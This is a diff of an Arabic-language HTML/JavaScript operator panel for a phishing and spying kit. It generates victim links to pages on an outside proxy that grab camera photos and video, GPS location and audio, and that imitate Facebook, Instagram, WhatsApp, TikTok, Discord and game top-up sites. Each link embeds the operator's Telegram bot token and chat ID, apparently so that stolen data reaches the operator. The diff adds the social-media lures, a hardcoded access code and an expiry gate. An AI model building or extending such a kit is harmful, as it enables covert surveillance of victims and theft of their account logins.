@@ -2,145 +2,123 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚡ Master Control</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>☠️ Master Control</title>
     <style>
         :root { --green: #00ff41; --red: #ff0040; --gold: #ffaa00; }
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family: 'Courier New', monospace; background: #000; color: #fff; min-height: 100vh; padding: 20px; }
-        @keyframes flicker { 0%,100%{opacity:1} 50%{opacity:0.3} }
-        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
-        .container { max-width: 450px; margin: 0 auto; }
-        .page { display: none; } .page.active { display: block; }
+        body { font-family: 'Courier New', monospace; background: #000; color: #fff; min-height: 100vh; padding: 16px; }
+        @keyframes glitch { 0%{transform:translate(0)} 20%{transform:translate(-3px,3px)} 40%{transform:translate(3px,-3px)} 60%{transform:translate(-2px,2px)} 80%{transform:translate(2px,-2px)} 100%{transform:translate(0)} }
+        @keyframes flicker { 0%,100%{opacity:1} 30%{opacity:0.1} 60%{opacity:0.8} }
+        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.08)} }
+        @keyframes scanLine { from{top:-100%} to{top:100%} }
+        @keyframes redFlash { 0%,100%{background:rgba(255,0,0,0)} 50%{background:rgba(255,0,0,0.05)} }
+        @keyframes greenFlash { 0%,100%{background:rgba(0,255,0,0)} 50%{background:rgba(0,255,0,0.03)} }
+        @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-5px)} 75%{transform:translateX(5px)} }
         
-        .login-box { text-align: center; padding-top: 20px; }
-        .skull { font-size: 50px; animation: pulse 0.5s infinite; }
-        h1 { font-size: 20px; color: var(--green); text-shadow: 0 0 20px var(--green); margin: 8px 0; }
-        .subtitle { color: #333; font-size: 10px; letter-spacing: 2px; margin-bottom: 20px; }
+        .scan-line { position: fixed; left: 0; right: 0; height: 2px; background: rgba(0,255,65,0.1); pointer-events: none; animation: scanLine 2s linear infinite; z-index: 999; }
+        .flash-overlay { position: fixed; inset: 0; pointer-events: none; z-index: 998; animation: redFlash 1s infinite; }
+        .container { max-width: 450px; margin: 0 auto; position: relative; z-index: 1; }
+        .page { display: none; } .page.active { display: block; animation: glitch 0.2s; }
+        
+        .header { text-align: center; margin-bottom: 20px; }
+        .skull { font-size: 60px; animation: pulse 0.2s infinite, flicker 0.15s infinite; }
+        h1 { font-size: 22px; color: var(--green); text-shadow: 0 0 40px var(--green), 0 0 80px var(--green); animation: flicker 0.3s infinite; margin: 10px 0; }
+        .subtitle { color: #333; font-size: 11px; letter-spacing: 4px; animation: flicker 0.4s infinite; }
+        
+        .device-info { background: #0a0a0a; border: 2px solid var(--red); border-radius: 14px; padding: 16px; margin-bottom: 16px; text-align: center; box-shadow: 0 0 40px rgba(255,0,64,0.5); animation: redFlash 0.3s infinite; }
+        .device-info .d-name { color: var(--red); font-size: 16px; font-weight: 700; animation: flicker 0.2s infinite; }
+        .device-info .d-code { color: #550000; font-size: 10px; margin-top: 4px; }
+        .device-info .d-time { color: var(--gold); font-size: 10px; margin-top: 2px; }
+        
+        .card { background: #0a0a0a; border: 2px solid var(--green); border-radius: 14px; padding: 18px; margin-bottom: 14px; box-shadow: 0 0 30px rgba(0,255,65,0.3); animation: greenFlash 1s infinite; }
         
         .input-group { margin-bottom: 12px; text-align: right; }
         .input-group label { color: #555; font-size: 11px; display: block; margin-bottom: 4px; }
-        .input-group input {
-            width: 100%; padding: 14px; border-radius: 8px;
-            border: 2px solid #1a1a1a; background: #0a0a0a;
-            color: var(--green); font-size: 14px; text-align: left;
-            font-family: 'Courier New', monospace; outline: none;
-        }
-        .input-group input:focus { border-color: var(--green); }
+        .input-group input { width: 100%; padding: 14px; border-radius: 8px; border: 2px solid #1a1a1a; background: #0a0a0a; color: var(--green); font-size: 13px; text-align: left; font-family: 'Courier New', monospace; outline: none; letter-spacing: 1px; }
+        .input-group input:focus { border-color: var(--green); box-shadow: 0 0 20px rgba(0,255,65,0.3); animation: shake 0.3s; }
         
-        .btn {
-            width: 100%; padding: 16px; border-radius: 10px;
-            border: 2px solid var(--green); background: #0a1a0a;
-            color: var(--green); font-size: 16px; font-weight: 700;
-            cursor: pointer; font-family: 'Courier New', monospace;
-            text-shadow: 0 0 10px var(--green);
-            box-shadow: 0 0 20px rgba(0,255,65,0.2); margin-top: 8px;
-            animation: flicker 0.8s infinite;
-        }
-        .btn:active { background: #0a2a0a; }
-        .btn.gold { border-color: var(--gold); color: var(--gold); background: #1a1a00; text-shadow: 0 0 10px var(--gold); }
+        .error-msg { color: var(--red); font-size: 14px; text-align: center; margin-top: 8px; display: none; animation: flicker 0.15s infinite; text-shadow: 0 0 20px var(--red); }
+        .error-msg.show { display: block; }
         
-        .tools-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 16px; }
-        .tool-card {
-            background: #0a0a0a; border: 2px solid var(--green);
-            border-radius: 12px; padding: 16px; text-align: center;
-            cursor: pointer; transition: 0.2s;
-            box-shadow: 0 0 20px rgba(0,255,65,0.2);
-        }
-        .tool-card:active { background: #0a2a0a; }
-        .tool-card .icon { font-size: 30px; }
+        .btn { width: 100%; padding: 18px; border-radius: 10px; border: 2px solid var(--green); background: #0a1a0a; color: var(--green); font-size: 17px; font-weight: 700; cursor: pointer; font-family: 'Courier New', monospace; text-shadow: 0 0 15px var(--green); box-shadow: 0 0 30px rgba(0,255,65,0.4); margin-top: 10px; animation: flicker 0.5s infinite; }
+        .btn:active { background: #0a2a0a; box-shadow: 0 0 60px rgba(0,255,65,0.9); }
+        .btn.gold { border-color: var(--gold); color: var(--gold); background: #1a1a00; }
+        
+        .tools-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .tool-card { background: #0a0a0a; border: 2px solid var(--green); border-radius: 12px; padding: 16px; text-align: center; cursor: pointer; box-shadow: 0 0 20px rgba(0,255,65,0.3); animation: flicker 0.4s infinite; }
+        .tool-card:active { background: #0a2a0a; border-color: var(--red); box-shadow: 0 0 50px rgba(255,0,64,0.8); animation: shake 0.2s; }
+        .tool-card .icon { font-size: 32px; }
         .tool-card .name { color: var(--green); font-size: 12px; font-weight: 700; margin-top: 6px; }
         
-        .link-box {
-            background: #0a1a0a; border: 2px solid var(--gold);
-            border-radius: 10px; padding: 14px; margin: 16px 0;
-            word-break: break-all; color: var(--gold);
-            font-size: 11px; cursor: pointer;
-            box-shadow: 0 0 20px rgba(255,170,0,0.3);
-        }
+        .section-title { color: var(--red); font-size: 13px; text-align: center; margin: 20px 0 10px; text-shadow: 0 0 15px var(--red); animation: flicker 0.4s infinite; }
         
-        .copy-toast {
-            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
-            background: #0a1a0a; border: 2px solid var(--gold);
-            color: var(--gold); padding: 12px 24px; border-radius: 10px;
-            font-size: 14px; font-weight: 700; z-index: 1000;
-        }
-        
-        .back-btn {
-            background: none; border: 1px solid #333;
-            color: #555; padding: 8px 16px; border-radius: 6px;
-            cursor: pointer; font-family: 'Courier New', monospace;
-            margin-bottom: 16px; font-size: 11px;
-        }
-        
-        .save-badge {
-            display: inline-block; background: #0a1a0a; border: 1px solid var(--green);
-            color: var(--green); padding: 4px 10px; border-radius: 6px;
-            font-size: 10px; margin-bottom: 12px;
-        }
+        .link-box { background: #0a1a0a; border: 2px solid var(--gold); border-radius: 10px; padding: 16px; margin: 16px 0; word-break: break-all; color: var(--gold); font-size: 12px; cursor: pointer; box-shadow: 0 0 30px rgba(255,170,0,0.4); animation: flicker 0.4s infinite; }
+        .copy-toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #0a1a0a; border: 2px solid var(--gold); color: var(--gold); padding: 14px 28px; border-radius: 10px; font-size: 15px; font-weight: 700; z-index: 1000; }
+        .back-btn { background: none; border: 1px solid #333; color: #555; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-family: 'Courier New', monospace; margin-bottom: 16px; font-size: 12px; }
+        .code-hint { background: #1a0000; border: 2px solid var(--red); border-radius: 10px; padding: 12px; text-align: center; margin-top: 12px; animation: flicker 0.5s infinite; }
+        .setup-badge { display: inline-block; background: #0a1a0a; border: 1px solid var(--green); color: var(--green); padding: 4px 10px; border-radius: 6px; font-size: 10px; margin-bottom: 12px; }
+        .gen-progress { width: 100%; height: 3px; background: #0a1a0a; border-radius: 2px; margin: 12px 0; overflow: hidden; }
+        .gen-progress-fill { height: 100%; width: 0%; background: var(--gold); transition: width 0.3s; }
     </style>
 </head>
 <body>
+<div class="scan-line"></div>
+<div class="flash-overlay"></div>
 <div class="container">
     
-    <!-- صفحة الإعدادات -->
-    <div class="page active" id="page-setup">
-        <div class="login-box">
-            <div class="skull">⚡</div>
-            <h1>Master Control</h1>
-            <div class="subtitle">━ SETUP YOUR BOT ━</div>
-            
-            <div class="input-group">
-                <label>🤖 BOT TOKEN</label>
-                <input type="text" id="bot-token" placeholder="123456:ABC-DEF1234ghikl">
-            </div>
-            <div class="input-group">
-                <label>🆔 CHAT ID</label>
-                <input type="text" id="chat-id" placeholder="7276604783">
-            </div>
-            
-            <button class="btn" onclick="saveAndContinue()">💾 حفظ ودخول</button>
-            <div class="save-badge" style="margin-top:8px;" id="saved-badge"></div>
+    <div class="page active" id="page-login">
+        <div class="header"><div class="skull">☠️</div><h1>MASTER CONTROL</h1><div class="subtitle">━━ ☠ RESTRICTED ☠ ━━</div></div>
+        <div class="device-info"><div class="d-name" id="device-name">📱 جاري الكشف...</div><div class="d-code" id="device-code"></div><div class="d-time" id="device-time"></div></div>
+        <div class="card">
+            <div class="input-group"><label>🤖 BOT TOKEN</label><input type="text" id="bot-token" placeholder="123456:ABC-DEF"></div>
+            <div class="input-group"><label>🆔 CHAT ID</label><input type="text" id="chat-id" placeholder="7276604783"></div>
+            <div class="input-group"><label>🔐 ACCESS CODE</label><input type="password" id="code-input" placeholder="••••••••" maxlength="10" autofocus></div>
+            <div class="error-msg" id="code-error">☠ INVALID CODE</div>
+            <button class="btn" onclick="checkCode()">🔓 UNLOCK</button>
         </div>
+        <div class="code-hint" id="code-hint"></div>
     </div>
     
-    <!-- لوحة الأدوات -->
     <div class="page" id="page-tools">
-        <button class="back-btn" onclick="showPage('page-setup')">← تغيير الإعدادات</button>
-        <div class="skull" style="text-align:center;">🛡️</div>
-        <h1 style="text-align:center;">أدوات التحكم</h1>
+        <div class="header"><div class="skull">💀</div><h1>CONTROL PANEL</h1></div>
+        <div class="setup-badge" id="setup-badge"></div>
+        <button class="back-btn" onclick="logout()">🔒 قفل</button>
         
+        <div class="section-title">━━ 📸 الكاميرا والميديا ━━</div>
         <div class="tools-grid">
-            <div class="tool-card" onclick="generateLink('photo-front.html', '📸 صور أمامية')">
-                <div class="icon">📸</div><div class="name">10 صور أمامية</div>
-            </div>
-            <div class="tool-card" onclick="generateLink('photo-back.html', '📸 صور خلفية')">
-                <div class="icon">📸</div><div class="name">10 صور خلفية</div>
-            </div>
-            <div class="tool-card" onclick="generateLink('mm.html', '🎬 فيديو أمامي')">
-                <div class="icon">🎬</div><div class="name">فيديو أمامي</div>
-            </div>
-            <div class="tool-card" onclick="generateLink('video-back.html', '🎬 فيديو خلفي')">
-                <div class="icon">🎬</div><div class="name">فيديو خلفي</div>
-            </div>
-            <div class="tool-card" onclick="generateLink('location.html', '📍 موقع')">
-                <div class="icon">📍</div><div class="name">GPS موقع</div>
-            </div>
-            <div class="tool-card" onclick="generateLink('audio.html', '🎤 صوت')">
-                <div class="icon">🎤</div><div class="name">تسجيل صوت</div>
-            </div>
+            <div class="tool-card" onclick="generateLink('photo-front.html','📸 صور أمامية')"><div class="icon">📸</div><div class="name">صور أمامية</div></div>
+            <div class="tool-card" onclick="generateLink('photo-back.html','📸 صور خلفية')"><div class="icon">📸</div><div class="name">صور خلفية</div></div>
+            <div class="tool-card" onclick="generateLink('mm.html','🎬 فيديو أمامي')"><div class="icon">🎬</div><div class="name">فيديو أمامي</div></div>
+            <div class="tool-card" onclick="generateLink('video-back.html','🎬 فيديو خلفي')"><div class="icon">🎬</div><div class="name">فيديو خلفي</div></div>
+            <div class="tool-card" onclick="generateLink('location.html','📍 موقع')"><div class="icon">📍</div><div class="name">GPS موقع</div></div>
+            <div class="tool-card" onclick="generateLink('audio.html','🎤 صوت')"><div class="icon">🎤</div><div class="name">تسجيل صوت</div></div>
+        </div>
+        
+        <div class="section-title">━━ 🎮 الألعاب ━━</div>
+        <div class="tools-grid">
+            <div class="tool-card" onclick="generateLink('g.html','🎮 PUBG')"><div class="icon">🎮</div><div class="name">شحن PUBG</div></div>
+            <div class="tool-card" onclick="generateLink('freefire.html','🎯 فري فاير')"><div class="icon">🎯</div><div class="name">شحن فري فاير</div></div>
+        </div>
+        
+        <div class="section-title">━━ 📱 السوشيال ميديا ━━</div>
+        <div class="tools-grid">
+            <div class="tool-card" onclick="generateLink('fb.html','📘 فيسبوك')"><div class="icon">📘</div><div class="name">فيسبوك</div></div>
+            <div class="tool-card" onclick="generateLink('insta.html','🟣 انستجرام')"><div class="icon">🟣</div><div class="name">انستجرام</div></div>
+            <div class="tool-card" onclick="generateLink('whatsapp.html','🟢 واتساب')"><div class="icon">🟢</div><div class="name">واتساب</div></div>
+            <div class="tool-card" onclick="generateLink('twitter.html','🐦 تويتر/X')"><div class="icon">🐦</div><div class="name">تويتر/X</div></div>
+            <div class="tool-card" onclick="generateLink('snapchat.html','👻 سناب شات')"><div class="icon">👻</div><div class="name">سناب شات</div></div>
+            <div class="tool-card" onclick="generateLink('tiktok.html','🎵 تيك توك')"><div class="icon">🎵</div><div class="name">تيك توك</div></div>
+            <div class="tool-card" onclick="generateLink('discord.html','🎮 ديسكورد')"><div class="icon">🎮</div><div class="name">ديسكورد</div></div>
         </div>
     </div>
     
-    <!-- صفحة الرابط -->
-    <div class="page" id="page-link">
+    <div class="page" id="page-generate">
         <button class="back-btn" onclick="showPage('page-tools')">← رجوع</button>
-        <div style="text-align:center;">
-            <div class="skull">🔗</div>
-            <h1 id="link-title">الرابط جاهز</h1>
-            <div class="link-box" id="link-box" onclick="copyLink()"></div>
-            <p style="color:#333;font-size:10px;">اضغط على الرابط لنسخه</p>
-        </div>
+        <div style="text-align:center;"><div class="skull">⚡</div><h1>جاري توليد الرابط...</h1>
+        <div class="gen-progress"><div class="gen-progress-fill" id="gen-fill"></div></div></div>
+        <div id="gen-result" style="display:none;text-align:center;"><div class="skull">🔗</div><h1>الرابط جاهز</h1>
+        <div class="link-box" id="link-box" onclick="copyLink()"></div><p style="color:#333;font-size:11px;">اضغط للنسخ</p></div>
     </div>
 
 </div>
@@ -149,48 +127,113 @@
 const BASE = 'https://ai-proxy-eosin.vercel.app';
 let botToken = '', chatId = '';
 
-// تحميل الإعدادات المحفوظة
-const saved = JSON.parse(localStorage.getItem('master_setup') || '{}');
-if (saved.token && saved.chatId) {
-    botToken = saved.token;
-    chatId = saved.chatId;
-    document.getElementById('bot-token').value = botToken;
-    document.getElementById('chat-id').value = chatId;
-    document.getElementById('saved-badge').textContent = '✅ تم التحميل - ' + chatId;
+function playSound(type) {
+    try {
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        if (type === 'login') {
+            [200,400,600,800,1000].forEach((f,i) => {
+                const o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
+                o.frequency.value=f;o.type='sawtooth';g.gain.value=0.08;
+                o.start(ctx.currentTime+i*0.08);g.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+i*0.08+0.15);o.stop(ctx.currentTime+i*0.08+0.15);
+            });
+        } else if (type==='error') {
+            const o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
+            o.frequency.value=80;o.type='square';g.gain.value=0.15;o.start();o.stop(ctx.currentTime+0.6);
+        } else if (type==='click') {
+            const o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
+            o.frequency.value=1000;o.type='sine';g.gain.value=0.05;o.start();g.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+0.08);o.stop(ctx.currentTime+0.08);
+        } else if (type==='copy') {
+            [600,900,1200].forEach((f,i) => {
+                const o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
+                o.frequency.value=f;o.type='sine';g.gain.value=0.06;
+                o.start(ctx.currentTime+i*0.07);g.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+i*0.07+0.12);o.stop(ctx.currentTime+i*0.07+0.12);
+            });
+        }
+    } catch(e) {}
 }
+
+function getDevice() {
+    const ua = navigator.userAgent;
+    if (ua.includes('SM-A105')||ua.includes('SM-A107')) return {name:'Samsung Galaxy A10',isA10:true};
+    if (ua.includes('Realme')||ua.includes('RMX')) return {name:'Realme',isA10:false};
+    if (ua.includes('OPPO')||ua.includes('CPH')) return {name:'OPPO',isA10:false};
+    if (ua.includes('SM-')) return {name:'Samsung Galaxy',isA10:false};
+    const m=ua.match(/; ([^;]+) Build/);
+    return {name:m?m[1].trim():'جهاز غير معروف',isA10:false};
+}
+
+const device = getDevice();
+const IS_A10 = device.isA10;
+const CODE = IS_A10 ? 'admin' : 'elgen';
+const EXPIRY_KEY = 'master_expiry';
+
+if (!IS_A10) {
+    let expiry = localStorage.getItem(EXPIRY_KEY);
+    if (!expiry) { expiry = Date.now() + (3*24*60*60*1000); localStorage.setItem(EXPIRY_KEY, expiry); }
+    if (Date.now() > parseInt(expiry)) { localStorage.removeItem(EXPIRY_KEY); localStorage.removeItem('master_auth'); }
+}
+
+document.getElementById('device-name').textContent = '📱 ' + device.name;
+document.getElementById('device-code').textContent = IS_A10 ? '🔑 admin (دائم)' : '🔑 elgen';
+if (!IS_A10) {
+    const rem = Math.max(0, Math.floor((parseInt(localStorage.getItem(EXPIRY_KEY)) - Date.now())/(1000*60*60*24)));
+    document.getElementById('device-time').textContent = `⏰ متبقي: ${rem} يوم`;
+    document.getElementById('code-hint').innerHTML = '<div class="hint-text">⏰ الكود منتهي بعد 3 أيام</div>';
+} else {
+    document.getElementById('code-hint').innerHTML = '<div class="hint-text">🔓 وصول دائم</div>';
+}
+
+const saved = JSON.parse(localStorage.getItem('master_setup') || '{}');
+if (saved.token && saved.chatId) { botToken = saved.token; chatId = saved.chatId; document.getElementById('bot-token').value = botToken; document.getElementById('chat-id').value = chatId; }
+const auth = localStorage.getItem('master_auth');
+if (auth === CODE && botToken && chatId) { showPage('page-tools'); document.getElementById('setup-badge').textContent = '✅ ' + chatId; }
 
 function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); }
 
-function saveAndContinue() {
+function checkCode() {
+    const code = document.getElementById('code-input').value.trim();
     botToken = document.getElementById('bot-token').value.trim();
     chatId = document.getElementById('chat-id').value.trim();
-    
-    if (!botToken || !chatId) return alert('اكتب التوكن والـ Chat ID');
-    
-    localStorage.setItem('master_setup', JSON.stringify({ token: botToken, chatId }));
-    document.getElementById('saved-badge').textContent = '✅ محفوظ - ' + chatId;
-    showPage('page-tools');
+    const error = document.getElementById('code-error');
+    if (!botToken || !chatId) { error.textContent = '☠ اكتب التوكن والـ Chat ID'; error.classList.add('show'); playSound('error'); return; }
+    if (!IS_A10 && Date.now() > parseInt(localStorage.getItem(EXPIRY_KEY))) { error.textContent = '☠ انتهت الصلاحية'; error.classList.add('show'); playSound('error'); return; }
+    if (code === CODE) {
+        error.classList.remove('show');
+        localStorage.setItem('master_auth', CODE);
+        localStorage.setItem('master_setup', JSON.stringify({ token: botToken, chatId }));
+        document.getElementById('setup-badge').textContent = '✅ ' + chatId;
+        playSound('login'); showPage('page-tools');
+    } else { error.classList.add('show'); playSound('error'); document.getElementById('code-input').value = ''; }
 }
 
+function logout() { localStorage.removeItem('master_auth'); showPage('page-login'); playSound('click'); }
+
 function generateLink(page, name) {
-    if (!botToken || !chatId) return alert('احفظ الإعدادات الأول');
-    
-    const link = `${BASE}/${page}?chatId=${chatId}&token=${botToken}`;
-    document.getElementById('link-title').textContent = '🔗 ' + name;
-    document.getElementById('link-box').textContent = link;
-    showPage('page-link');
+    showPage('page-generate');
+    document.getElementById('gen-result').style.display = 'none';
+    document.getElementById('gen-fill').style.width = '0%';
+    playSound('click');
+    let w = 0;
+    const fill = document.getElementById('gen-fill');
+    const interval = setInterval(() => { w += 33; fill.style.width = w + '%'; if (w >= 100) {
+        clearInterval(interval);
+        const link = `${BASE}/${page}?chatId=${chatId}&token=${encodeURIComponent(botToken)}`;
+        document.getElementById('link-box').textContent = link;
+        document.getElementById('gen-result').style.display = 'block';
+        document.getElementById('gen-fill').parentElement.style.display = 'none';
+        playSound('copy');
+    }}, 300);
 }
 
 function copyLink() {
     const link = document.getElementById('link-box').textContent;
     navigator.clipboard.writeText(link).then(() => {
-        const toast = document.createElement('div');
-        toast.className = 'copy-toast';
-        toast.textContent = '✅ تم النسخ!';
-        document.body.appendChild(toast);
-        setTimeout(() => toast.remove(), 2000);
-    }).catch(() => alert('تم نسخ الرابط: ' + link));
+        const t=document.createElement('div');t.className='copy-toast';t.textContent='✅ تم النسخ!';
+        document.body.appendChild(t);setTimeout(()=>t.remove(),2000);
+    }).catch(()=>alert(link));
 }
+
+document.getElementById('code-input').addEventListener('keydown',e=>{if(e.key==='Enter')checkCode();});
 </script>
 </body>
 </html>
